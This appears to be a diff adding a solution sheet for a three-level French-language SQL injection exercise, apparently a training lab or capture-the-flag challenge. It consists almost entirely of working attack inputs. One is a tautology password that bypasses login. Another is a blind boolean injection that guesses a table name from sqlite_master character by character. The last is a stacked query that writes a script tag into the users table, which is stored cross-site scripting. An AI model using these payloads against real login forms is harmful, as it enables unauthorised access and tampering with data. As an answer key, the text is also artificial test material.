@@ -1,0 +1,18 @@
+Niveau 1:
+    username: foo
+    password: ' or 'l' = 'l
+
+Niveau 2:
+Iteration 1:
+    username: foo
+    password: ' OR (SELECT name FROM sqlite_master WHERE type='table') LIKE 'u%
+Iteration 2:
+    username: foo
+    password: ' OR (SELECT name FROM sqlite_master WHERE type='table') LIKE 'us%
+...
+Final:
+    username: foo
+    password: ' OR (SELECT name FROM sqlite_master WHERE type='table') LIKE 'users
+
+Niveau 3:
+    username: test1'; UPDATE users SET information = '<script>alert("Félicitations! Vous avez complété les 3 niveaux!")</script>' WHERE user = 'test1'; --
